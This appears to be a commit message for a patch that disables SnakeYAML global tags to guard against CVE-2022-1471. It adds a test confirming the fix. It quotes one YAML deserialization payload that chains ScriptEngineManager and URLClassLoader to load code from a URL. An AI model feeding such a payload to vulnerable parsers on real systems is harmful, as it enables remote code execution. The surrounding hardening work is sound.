Ensure that snakeyaml does not deserialize objects based on YAML tags
[CVE-2022-1471][1] describes an issue where versions of SnakeYAML prior to
2.0 would deserialize a YAML document and instantiate a class based on
the document contents.  This behavior can lead to issues like

```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8080/"]]]]
```

where untrusted code can be loaded over the internet into the
ClassLoader.

This issue is addressed in version 2.0 where SnakeYAML was altered to no
longer allow so-called "global tags" which are the mechanism used for
this arbitrary deserialization.  There is also the `SafeConstructor`
class which does not do any deserialization beyond primitive Java types
and basic collections.

We, however, need to deserialize to an object of our choice,
SubscriptionRegistry, so this patch explicitly disables global tags
(even though that is the default with SnakeYAML >2.0 anyway) and adds a
test to ensure global tags are disabled.

[1]: https://www.cve.org/CVERecord?id=CVE-2022-1471